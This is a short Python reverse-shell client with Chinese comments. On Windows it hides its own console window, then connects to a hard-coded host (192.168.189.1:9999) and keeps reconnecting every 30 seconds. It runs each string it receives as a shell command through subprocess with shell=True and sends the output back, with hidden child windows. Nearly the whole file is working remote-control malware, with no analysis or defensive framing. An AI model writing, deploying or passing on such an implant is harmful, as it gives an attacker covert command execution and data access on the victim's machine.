#客户端
import socket
import subprocess
import time
import select
import sys

# 隐藏窗口代码（仅Windows有效）
if sys.platform == 'win32':
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def execute_command(cmd, sock):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
            universal_newlines=True,
            startupinfo=startupinfo  # 隐藏子进程窗口
        )
        
        full_output = ""
        while True:
            chunk = proc.stdout.read(4096)
            if not chunk:
                if proc.poll() is not None:
                    break
                continue
            
            full_output += chunk
            total_sent = 0
            while total_sent < len(chunk):
                sent = sock.send(chunk[total_sent:].encode('utf-8', errors='replace'))
                if sent == 0:
                    raise BrokenPipeError
                total_sent += sent
        
        return full_output or "Command executed"
        
    except Exception as e:
        return f"Error: {str(e)}"

def maintain_connection(rhost, rport):
    while True:
        try:
            s = socket.socket()
            s.connect((rhost, rport))
            while True:
                ready, _, _ = select.select([s], [], [], 60)
                if ready:
                    cmd = s.recv(1024).decode()
                    if cmd == "heartbeat":
                        s.send(b"alive")
                        continue
                    execute_command(cmd, s)
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    maintain_connection("192.168.189.1", 9999)
  #192.168.189.1替换为客户端ip
